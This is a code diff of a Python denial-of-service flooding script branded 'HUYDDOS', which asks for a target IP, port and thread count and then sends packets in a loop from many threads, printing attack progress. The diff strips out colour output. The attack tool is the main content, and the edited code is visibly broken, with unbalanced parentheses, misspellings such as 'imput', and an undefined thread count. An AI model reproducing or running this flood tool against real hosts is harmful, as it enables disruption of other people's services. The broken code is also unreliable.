@@ -3,9 +3,8 @@ import threading
 import socket
 import os
 import time
-from termcoler import colored 
 os.system('cls')
-print(colored(r"""
+print(r"""
 ██╗░░██╗██╗░░░██╗██╗░░░██╗██████╗░██████╗░░█████╗░░██████╗
 ██║░░██║██║░░░██║╚██╗░██╔╝██╔══██╗██╔══██╗██╔══██╗██╔════╝
 ███████║██║░░░██║░╚████╔╝░██║░░██║██║░░██║██║░░██║╚█████╗░
@@ -13,28 +12,28 @@ print(colored(r"""
 ██║░░██║╚██████╔╝░░░██║░░░██████╔╝██████╔╝╚█████╔╝██████╔╝
 ╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚═════╝░╚═════╝░░╚════╝░╚═════╝░
                                                 Created By HuyXingum""", 'red'))
-print(colored("\n########################################################################\n", 'green'))
-ip = str(input(colored("[+] IP: ", 'green')))
-port = int(input(colored("[+] Port: ", 'green')))
-packet = int(imput(colored("[+] Threads: ", 'green')))
+print("\n########################################################################\n",))
+ip = str(input("[+] IP: ",)))
+port = int(input("[+] Port: ",)))
+packet = int(imput("[+] Threads: ",)))
 time.sleep(1.5)
 os.system('cls')
-print(colored(r"""
+print(r"""
 ░█████╗░████████╗████████╗░█████╗░░█████╗░██╗░░██╗
 ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║░██╔╝
 ███████║░░░██║░░░░░░██║░░░███████║██║░░╚═╝█████═╝░
 ██╔══██║░░░██║░░░░░░██║░░░██╔══██║██║░░██╗██╔═██╗░
 ██║░░██║░░░██║░░░░░░██║░░░██║░░██║╚█████╔╝██║░╚██╗
-╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝ """, 'green'))
-print(colored("\n########################################################################", 'red'))
+╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝ """,))
+print("\n########################################################################", 'red'))
 time.sleep(2)
-print(colored("\n[+] Start...", 'green'))
+print("\n[+] Start...",))
 time.sleep(1)
-print(colored("\n3", 'green'))
+print("\n3",))
 time.sleep(1)
-print(colored("\n2", 'green'))
+print("\n2",))
 time.sleep(1)
-print(colored("\n1", 'green'))
+print("\n1",))
 os.system('cls')
 def syn():
 
@@ -48,10 +47,10 @@ def syn():
             for i in range(packet):
                 h.send(hevin)
             bb += 1
-            print(colored('[+] Attaking '+ip + '>>>Sent: '+str(bb), 'red'))
+            print('[+] Attaking '+ip + '>>>Sent: '+str(bb), 'red'))
         except KeyboardInterrupt:
             h.close()
-            print(colored("[+++] DONE !!!", 'green'))
+            print("[+++] DONE !!!",))
             pass
 for b in range(thread):
     thread = threading.Thread(target=syn)
